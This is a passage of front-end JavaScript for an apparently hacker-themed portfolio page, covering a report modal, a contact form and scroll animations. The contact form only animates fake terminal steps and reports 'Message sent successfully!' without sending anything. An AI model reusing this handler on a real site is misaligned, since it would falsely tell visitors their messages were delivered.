    reportModalBody.innerHTML = r.body;
    reportPanel.classList.add('open');
    reportOverlay.classList.add('visible');
    document.body.style.overflow = 'hidden';
  };

  const closeReport = () => {
    playSound('click');
    reportPanel.classList.remove('open');
    reportOverlay.classList.remove('visible');
    document.body.style.overflow = '';
  };

  document.querySelectorAll('.open-report').forEach(btn => {
    btn.addEventListener('click', e => openReport(e.currentTarget.getAttribute('data-project')));
  });

  if (reportCloseBtn) reportCloseBtn.addEventListener('click', closeReport);
  if (reportOverlay) reportOverlay.addEventListener('click', closeReport);




  // ─── CONTACT FORM ─────────────────────────────────────────────────────────────
  const contactForm = document.getElementById('contact-form');
  const formStatus = document.getElementById('form-status');
  if (contactForm && formStatus) {
    contactForm.addEventListener('submit', e => {
      e.preventDefault();
      playSound('click');
      const name = document.getElementById('form-name').value;
      const email = document.getElementById('form-email').value;
      const message = document.getElementById('form-message').value;
      if (!name || !email || !message) {
        playSound('error');
        formStatus.textContent = '[-] Error: All fields are required.';
        formStatus.style.color = 'var(--red)';
        return;
      }
      const steps = [
        '[*] Establishing connection...',
        '[*] Encoding message payload...',
        '[+] Message sent successfully!'
      ];
      let i = 0;
      formStatus.textContent = steps[i];
      formStatus.style.color = 'var(--accent)';
      const iv = setInterval(() => {
        i++;
        if (i >= steps.length) {
          clearInterval(iv);
          playSound('success');
          contactForm.reset();
          return;
        }
        playSound('type');
        formStatus.textContent = steps[i];
        if (i === steps.length - 1) formStatus.style.color = 'var(--accent-secondary)';
      }, 700);
    });
  }

  // ─── SCROLL REVEAL ────────────────────────────────────────────────────────────
  const revealEls = document.querySelectorAll('.fade-in-scroll');
  if (revealEls.length > 0) {
    const obs = new IntersectionObserver(entries => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('is-visible');
          if (entry.target.id === 'experience') {
            const glow = entry.target.querySelector('.timeline-glow');
            if (glow) glow.style.height = '100%';
          }
        }
      });
    }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });
    revealEls.forEach(el => obs.observe(el));
  }
});
